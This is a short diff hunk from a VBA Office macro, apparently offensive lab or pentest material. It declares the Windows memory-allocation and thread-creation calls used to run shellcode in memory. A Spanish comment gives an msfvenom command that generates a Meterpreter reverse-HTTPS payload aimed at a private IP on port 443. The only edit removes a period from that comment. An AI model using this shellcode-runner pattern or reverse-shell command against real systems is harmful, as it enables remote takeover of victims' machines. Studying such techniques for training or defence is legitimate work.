@@ -2,7 +2,7 @@ Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal ipAddress As
 Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLenght As Long) As LongPtr
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
-'Ahora creamos el payload que queramos para ver el tamaño.
+'Ahora creamos el payload que queramos para ver el tamaño
 'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
 'Esto te dará una variable buf= Array(numeros y numeros)
 
